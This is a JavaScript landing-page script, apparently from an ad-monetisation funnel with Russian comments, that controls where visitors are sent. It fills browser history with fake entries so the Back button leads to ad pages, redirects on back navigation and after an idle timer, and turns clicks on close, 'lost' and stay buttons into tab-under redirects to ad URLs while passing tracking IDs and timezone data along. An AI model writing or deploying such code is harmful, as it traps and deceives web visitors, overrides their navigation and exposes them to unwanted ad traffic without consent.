/* common.js — FINAL FIXED (Chest Lost = Clone) */

(() => {
  "use strict";

  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  
  const replaceTo = (url) => {
    try { window.location.replace(url); } catch { window.location.href = url; }
  };

  const openTab = (url) => {
    try {
      const w = window.open(url, "_blank");
      if (w) { try { w.opener = null; } catch {} }
      return w || null;
    } catch { return null; }
  };

  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
  const CLONE_PARAM = "__cl";
  const isClone = getSP(CLONE_PARAM) === "1";

  const IN = {
    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
    cid: getSP("cid"), geo: getSP("geo"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
      };
      return btoa(JSON.stringify(payload));
    } catch { return ""; }
  };

  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
    const cfg = { domain: appCfg.domain };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;

      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
        return;
      }
      
      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) { ensure(m[1])[m[2]] = v; return; }
      
      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
      }
    });
    return cfg;
  };

  const buildExitQSFast = ({ zoneId }) => {
    const base = {
      ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
      b: IN.b || "", campaignid: IN.campaignid || "", click_id: IN.s || "", rhd: IN.rhd || "1",
      btz: getTimezoneName(), bto: String(getTimezoneOffset()),
      cmeta: buildCmeta(), pz: IN.pz || "", tb: IN.tb || "", tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "",
    };
    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
    return qsFromObj(base);
  };

  const generateAfuUrlFast = (zoneId, domain) => {
    const host = String(domain || "").trim();
    if (!host) return "";
    const base = host.startsWith("http") ? host : `https://${host}`;
    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
    url.search = buildExitQSFast({ zoneId }).toString();
    return url.toString();
  };

  const pushBackStates = (url, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href;
      for (let i = 0; i < n; i++) { window.history.pushState({ __isBack: true }, "Please wait...", url); }
      window.history.pushState(null, document.title, originalUrl);
    } catch (e) {}
  };

  const initBackFast = (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return;
    // Исправлено: если в конфиге нет пути, берем back.html в корне
    const pageUrl = cfg.back?.pageUrl || "back.html";
    const page = new URL(pageUrl, window.location.origin + window.location.pathname);
    const qs = buildExitQSFast({ zoneId: b.zoneId });
    if (b.url) qs.set("url", String(b.url));
    else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
    page.search = qs.toString();
    pushBackStates(page.toString(), cfg.back?.count ?? 10);
  };

  const resolveUrlFast = (ex, cfg) => {
    if (!ex) return "";
    if (ex.url) return String(ex.url);
    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
    return "";
  };

  const runExitDualTabsFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name];
    if (!ex) return;
    
    const ct = ex.currentTab; 
    const nt = ex.newTab;     
    
    const ctUrl = resolveUrlFast(ct, cfg);
    const ntUrl = resolveUrlFast(nt, cfg);

    safe(() => {
      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId });
      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId });
    });

    if (withBack) initBackFast(cfg);
    if (ntUrl) openTab(ntUrl);
    if (ctUrl) { setTimeout(() => replaceTo(ctUrl), 40); }
  };

  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name]?.currentTab;
    if (!ex) return;
    const url = resolveUrlFast(ex, cfg);
    if (!url) return;
    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId }));
    if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
    else { replaceTo(url); }
  };

  const run = (cfg, name) => {
    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
    return runExitCurrentTabFast(cfg, name, true);
  };

  // --- REVERSE ---
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab) return;
    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
    window.addEventListener("popstate", (e) => { 
        // Если это не наш внутренний бэк-стейт, триггерим редирект
        if (!e.state || !e.state.__isBack) {
            runExitCurrentTabFast(cfg, "reverse", false); 
        }
    });
  };

  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;
    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
    let armed = false;
    const trigger = () => { if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true); };
    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
    const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
  };

  // --- MICRO HANDOFF ---
  const buildCloneUrl = () => {
    const u = new URL(window.location.href);
    u.searchParams.set(CLONE_PARAM, "1");
    u.searchParams.set("__skipPreview", "1");
    return u.toString();
  };

  const runMicroHandoff = (cfg) => {
    if (isClone) {
        run(cfg, "mainExit");
        return;
    }
    const cloneUrl = buildCloneUrl();
    safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
    openTab(cloneUrl);

    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
    const monetUrl = resolveUrlFast(ex, cfg);

    if (monetUrl) {
      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
      initBackFast(cfg);
      setTimeout(() => replaceTo(monetUrl), 40);
    } else {
      run(cfg, "mainExit");
    }
  };

  // --- CLICK MAP ---
  const initClickMap = (cfg) => {
    let fired = false;
    const microTargets = new Set(["chest_play", "chest_lost", "banner_close", "modal_stay"]);

    document.addEventListener("click", (e) => {
      const zone = e.target?.closest?.("[data-target]");
      const t = zone?.getAttribute("data-target") || "";
      const modal = document.getElementById("xh_exit_modal");
      const banner = document.getElementById("xh_banner");

      if (isClone) {
        if (fired) return;
        fired = true;
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        run(cfg, "mainExit");
        return;
      }

      if (!t && document.documentElement.dataset.landingName === "chest") return;

      if (t === "banner_main") {
        e.preventDefault(); run(cfg, "mainExit"); return;
      }
      
      if (microTargets.has(t)) {
        e.preventDefault(); e.stopPropagation();
        if (banner) banner.style.display = "none";
        if (modal) modal.style.display = "none";
        runMicroHandoff(cfg);
        return;
      }

      if (fired) return;
      fired = true;
      e.preventDefault();
      run(cfg, "mainExit");
    }, true);
  };

  const boot = () => {
    if (typeof window.APP_CONFIG === "undefined") return;
    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) return;

    window.LANDING_EXITS = { cfg, run: (name) => run(cfg, name) };
    
    // ПРАВКА: Вызываем инициализацию Бэка сразу при загрузке!
    initBackFast(cfg); 
    
    initClickMap(cfg);
    initAutoexit(cfg);
    initReverse(cfg); 
  };

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
